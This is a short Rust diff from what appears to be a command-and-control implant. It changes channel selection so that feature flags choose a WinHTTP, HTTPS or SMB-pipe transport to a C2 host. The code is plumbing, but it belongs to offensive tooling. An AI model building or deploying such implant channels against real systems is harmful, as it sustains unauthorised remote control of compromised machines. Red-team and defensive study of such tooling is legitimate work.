@@ -18,7 +18,13 @@ fn make_channel() -> Box<dyn crate::channel::Channel> {
         env!("DM_SMB_HOST"), env!("DM_SMB_PIPE"),
     )); }
 
-    Box::new(crate::channel::https::HttpsChannel::new(C2_HOST, C2_PORT))
+    #[cfg(all(feature = "channel-winhttp", target_os = "windows"))]
+    { return Box::new(crate::channel::winhttp::WinHttpChannel::new(C2_HOST, C2_PORT)); }
+
+    #[cfg(feature = "channel-https")]
+    { return Box::new(crate::channel::https::HttpsChannel::new(C2_HOST, C2_PORT)); }
+
+    panic!("no channel feature enabled");
 }
 
 pub struct Session {
